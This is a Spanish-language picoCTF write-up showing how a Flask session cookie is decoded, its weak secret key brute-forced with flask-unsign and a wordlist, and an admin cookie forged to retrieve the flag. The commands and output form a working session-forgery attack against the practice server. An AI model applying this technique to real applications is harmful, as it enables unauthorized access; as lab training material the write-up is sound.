## Objetivo
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/e99686c2e3e6cdd9e355f1d10c9d80d6/server.py) [http://mercury.picoctf.net:53700/](http://mercury.picoctf.net:53700/)
## Solución
Instalamos pipx
```bash
──(kali㉿kali)-[~/picoCTF]
└─$ pipx ensurepath
Success! Added /home/kali/.local/bin to the PATH environment variable.

Consider adding shell completions for pipx. Run 'pipx completions' for
instructions.

You will need to open a new terminal or re-login for the PATH changes to take
effect. Alternatively, you can source your shell's config file with e.g.
'source ~/.bashrc.

Otherwise pipx is ready to go! ✨ 🌟 ✨
                                                                                 
┌──(kali㉿kali)-[~/picoCTF]
└─$ source ~/.zshrc
┌──(kali㉿kali)-[~/picoCTF]
└─$ pipx install flask-unsign
  installed package flask-unsign 1.2.0, installed using Python 3.12.6
  These apps are now globally available
    - flask-unsign
done! ✨ 🌟 ✨
┌──(kali㉿kali)-[~/picoCTF]
└─$ flask-unsign --decode --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZvtrAA.HXA2cIX0vh26XWvp9oZnvamur0g"
{'very_auth': 'snickerdoodle'}
                             
```
Creamos un archivo con las galletas
```
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```
Finalmente cambiamos la cookie por la que nos va a dar la contraseña
```bash
┌──(kali㉿kali)-[~/picoCTF]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZvtrAA.HXA2cIX0vh26XWvp9oZnvamur0g" --wordlist galletas.txt 
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
┌──(kali㉿kali)-[~/picoCTF]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'peanut butter'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Zvtv6g.XmYDj_oJ0NiaWdkzziRkuWqb91w

┌──(kali㉿kali)-[~/picoCTF]
└─$ curl -s http://mercury.picoctf.net:52134/display -H 'Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Zvtv6g.XmYDj_oJ0NiaWdkzziRkuWqb91w' | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_3646b931}</code></p>



```
## Notas Adicionales
PipX es una **herramienta para instalar software escrito en Python por medio de espacios separados**. Está diseñada para ejecutar programas sin tener que forzar a cambiar la dependencia de otros programas.

## Referencias
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask